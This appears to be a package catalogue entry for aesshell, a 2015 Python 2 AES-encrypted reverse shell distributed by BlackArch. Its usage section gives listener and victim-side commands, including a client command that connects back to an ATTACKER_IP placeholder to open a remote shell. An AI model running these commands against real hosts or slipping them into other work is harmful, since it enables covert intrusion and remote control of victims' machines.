---
name: "aesshell"
categories:
  - blackarch-backdoor
version: "0.7"
homepage: "https://packetstormsecurity.com/files/132438/AESshell.7.html"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-25"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
worth: 0.4
worth-basis: "adoption-only (no upstream data)"
worth-checked: "2026-11-09"
---

# aesshell

> Python 2 backconnect shell for Windows and Unix whose traffic is encrypted with AES-CBC and authenticated with HMAC-SHA256 — a listener (`listen.py`) plus a backconnect client (`bc.py`/`bc.exe`) sharing a compiled-in key.

## What it's for

Getting an interactive shell out of a network where the compromised host cannot be reached inbound: the victim side connects out to an attacker-held listener, and the whole session is authenticated encryption (AES-192-CBC for confidentiality, HMAC-SHA256 for integrity, keys derived from a shared base64 key string baked into both ends at preparation time). On Unix the shell runs in a real PTY, so full-screen tools like vim work; on Windows a precompiled `bc.exe` (WinXP/Win7/Win8 era) is shipped so no Python installation is needed on the target, and the client retries the connection 10 times before giving up. It is a point-to-point encrypted reverse shell from 2015 — no staging, multiplexing or C2 features — and being Python 2 code it needs a python2 interpreter with pycryptodome on whichever side runs the scripts. BlackArch installs the three tools as `aesshell-listen`, `aesshell-bc` and `aesshell-prepare` (upstream names `listen.py`, `bc.py`, `prepare.py`).

## Typical use cases

### Listen for an encrypted backconnect shell

Start the attacker-side listener for a Unix or Windows target.

```
aesshell-listen -lip 0.0.0.0 -lport 1443 -os lnx
```

Outcome: binds 0.0.0.0:1443 and waits; when a client connects back, a full interactive PTY shell appears with all I/O decrypted/verified on the fly. Use `-os win` instead of `-os lnx` for a Windows target so the listener speaks the right side of the protocol.

### Connect back from the target

Run the victim-side client that phones the listener.

```
aesshell-bc -rip ATTACKER_IP -rport 1443
```

Outcome: the client tries up to 10 times to reach ATTACKER_IP:1443; once connected, keystrokes from the listener drive the shell. On Windows the shipped `bc.exe -rip ATTACKER_IP -rport 1443` does the same without needing Python installed.

### Rotate the shared encryption key

Regenerate the key embedded in both ends.

```
aesshell-prepare
```

Outcome: creates a fresh AES key, prints it, and writes re-keyed copies of `bc.py` and `listen.py` (plus the pyinstaller spec and Windows DLLs) into an `aesout/` directory — deploy the re-keyed pair together, since old and new keys are incompatible.

*No corpus evidence — derived from upstream documentation.*
